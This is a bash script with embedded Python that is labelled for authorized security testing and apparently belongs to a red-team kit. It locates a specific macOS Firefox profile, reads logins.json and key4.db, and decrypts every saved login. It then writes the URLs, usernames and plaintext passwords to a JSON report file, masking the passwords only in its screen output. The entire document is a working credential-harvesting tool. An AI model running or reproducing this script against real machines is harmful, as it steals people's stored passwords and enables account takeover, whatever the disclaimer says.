#!/bin/bash
# Firefox Password Decryption Script
# FOR AUTHORIZED SECURITY TESTING ONLY

set -e

echo "======================================================================"
echo "Firefox Password Decryption"
echo "======================================================================"
echo ""

PROFILE_PATH="$HOME/Library/Application Support/Firefox/Profiles/yxo4pq2t.default-release"
LOGINS_FILE="$PROFILE_PATH/logins.json"
KEY4_DB="$PROFILE_PATH/key4.db"

# Check if files exist
if [ ! -f "$LOGINS_FILE" ]; then
    echo "❌ Error: logins.json not found at $LOGINS_FILE"
    exit 1
fi

if [ ! -f "$KEY4_DB" ]; then
    echo "❌ Error: key4.db not found at $KEY4_DB"
    exit 1
fi

echo "[+] Found Firefox profile: $PROFILE_PATH"
echo "[+] Found logins.json: $LOGINS_FILE"
echo "[+] Found key4.db: $KEY4_DB"
echo ""

# Try to decrypt using Python
echo "[*] Attempting to decrypt passwords..."
echo ""

# Try method 1: Import firefox_decrypt module
python3 << 'PYTHON_EOF'
import sys
import os
import json

try:
    from firefox_decrypt import decrypt_passwords
    
    profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles/yxo4pq2t.default-release")
    
    print(f"[*] Decrypting passwords from: {profile_path}")
    print()
    
    passwords = decrypt_passwords(profile_path)
    
    print(f"✅ Successfully decrypted {len(passwords)} passwords!")
    print()
    print("=" * 70)
    print("DECRYPTED PASSWORDS")
    print("=" * 70)
    print()
    
    # Save to file
    output_file = "redteam_kit/reports/firefox_decrypted_passwords.json"
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    
    with open(output_file, 'w') as f:
        json.dump(passwords, f, indent=2)
    
    print(f"[+] Saved to: {output_file}")
    print()
    
    # Display first 10 passwords (masked)
    for i, entry in enumerate(passwords[:10], 1):
        print(f"[Login {i}]")
        print(f"  URL: {entry.get('url', 'N/A')}")
        print(f"  Username: {entry.get('username', 'N/A')}")
        password = entry.get('password', '')
        if password:
            masked = '*' * min(len(password), 20)
            print(f"  Password: {masked}... (length: {len(password)})")
        print()
    
    if len(passwords) > 10:
        print(f"... and {len(passwords) - 10} more passwords")
        print()
    
    print("=" * 70)
    print(f"Total: {len(passwords)} passwords decrypted")
    print("=" * 70)
    
except ImportError:
    print("❌ firefox-decrypt library not installed")
    print()
    print("To install:")
    print("  pip3 install firefox-decrypt")
    print()
    print("Then run this script again.")
    sys.exit(1)
except Exception as e:
    print(f"❌ Error decrypting passwords: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
PYTHON_EOF

exit_code=$?

if [ $exit_code -eq 137 ] || [ $exit_code -eq 9 ]; then
    echo ""
    echo "[!] Process was killed (resource limits)"
    echo ""
    echo "Try installing firefox-decrypt manually:"
    echo "  pip3 install firefox-decrypt"
    echo ""
    echo "Then run:"
    echo "  python3 -m firefox_decrypt '$PROFILE_PATH'"
    exit 1
fi

if [ $exit_code -eq 1 ]; then
    exit 1
fi

echo ""
echo "✅ Decryption complete!"

